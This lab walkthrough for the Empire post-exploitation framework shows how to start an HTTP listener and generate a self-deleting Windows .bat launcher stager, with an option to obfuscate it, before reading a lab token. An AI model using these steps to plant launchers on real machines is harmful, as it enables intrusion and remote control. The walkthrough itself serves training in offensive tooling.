# PSE

First moved to correct directory:

```
 cd /home/linux/Empire/
```

Run the empire command:

```
./empire
```

Program empire will start, as using listeners first, enter listener area:

```
 listeners
```

Output shoud look like:

```bash
===============================================================
 [Empire]  Post-Exploitation Framework
================================================================
 [Version] 2.5 | [Web] https://github.com/empireProject/Empire
================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       292 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > uselistener http
(Empire) > uselisteners http
(Empire) > listeners
[!] No listeners currently active 
```

To check listener types, type uselisteners, press tab after a few times, in linux this always lists asscoated files, folser, functions ect, this case http
```
uselisteners
```

Output

```bash
(Empire: listeners) > uselistener 
dbx           http          http_com      http_foreign  http_hop      http_mapi     meterpreter   onedrive      redirector 
```

Use http:
```
 uselistener http
```

Each setting can be checked by adding the extension and using tab a few times example for http output when typing set then tab:

```bash
(Empire: listeners/http) > set 
BindIP            DefaultDelay      DefaultProfile    KillDate          Port              SlackChannel      StagingKey
CertPath          DefaultJitter     Headers           Launcher          Proxy             SlackToken        UserAgent
Cookie            DefaultLostLimit  Host              Name              ProxyCreds        StagerURI         WorkingHours
```

Set port:

```
set port 8080
```

To start type execute:

```
execute
```

Output should be:

```bash
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
```

Check if live:

```
listeners
```

Type back to get back to main menu, then type `usestager` space bar and tab twice for options, command:
```
usestager
```

Output:

```bash
(Empire) > usestager 
multi/bash                osx/ducky                 osx/safari_launcher       windows/ducky             windows/macro
multi/launcher            osx/dylib                 osx/shellcode             windows/hta               windows/macroless_msword
multi/macro               osx/jar                   osx/teensy                windows/launcher_bat      windows/shellcode
multi/pyinstaller         osx/launcher              windows/backdoorLnkMacro  windows/launcher_lnk      windows/teensy
multi/war                 osx/macho                 windows/bunny             windows/launcher_sct      windows/wmic
osx/applescript           osx/macro                 windows/csharp_exe        windows/launcher_vbs      
osx/application           osx/pkg                   windows/dll               windows/launcher_xml      
(Empire) > usestager 
```

Select one required, in this case windows and press enter:

```
usestager windows/launcher_bat
```

Use `info` to display what information needs to be set, in this case the http listerner set earlier:

```
info
```

Command:

```
set Listener http
```

Check if http listener is set:

```
info
```

```bash
(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher

Description:
  Generates a self-deleting .bat launcher for
  Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True        http              Listener to generate stager for.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
```

Output show listener set, now generate the .bat

```
generate
```

Once completed output:

```bash
[*] Stager output written out to: /tmp/launcher.bat
```

Once this is done this lab is nearly complete, output is stated to:
`/home/linux/token.txt`, lets exit the program, type exit and click enter the y to confirm.

now read the token at the directory:
```
cat /home/linux/token.txt
```

Answer the other questions and your done.
